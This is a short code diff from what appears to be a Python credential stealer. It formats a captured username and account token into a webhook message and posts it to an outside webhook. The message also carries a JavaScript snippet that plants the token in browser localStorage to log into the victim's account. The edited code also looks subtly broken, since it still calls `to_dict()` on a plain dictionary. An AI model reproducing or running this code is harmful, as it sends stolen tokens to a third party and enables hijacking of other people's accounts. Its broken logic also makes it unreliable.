@@ -33,13 +33,11 @@ def main_page():
             token_str = original.split(" : ")[1]
             username = original.split(" : ")[0]
         try:
-            embed = Embed(
-                title=username, description=token_str)
             code = '```javascript\nlet token="**token**";function login(token){setInterval(()=>{document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token=`"${token}"`},50);setTimeout(()=>{location.reload()},2500)}login(token);\n```'
             code = code.replace('**token**', token)
-            embed.add_field(name='Javascript Code', value=code, inline=True)
+            embed = {"title": username, "description": token_str, "fields": [{"name": "Javascript Code", "value": code, "inline": False}]}
             data = {
-                "embeds":[token_str],
+                "embeds":[embed],
             }
             embed = embed.to_dict()
             requests.post(hook,json=data)
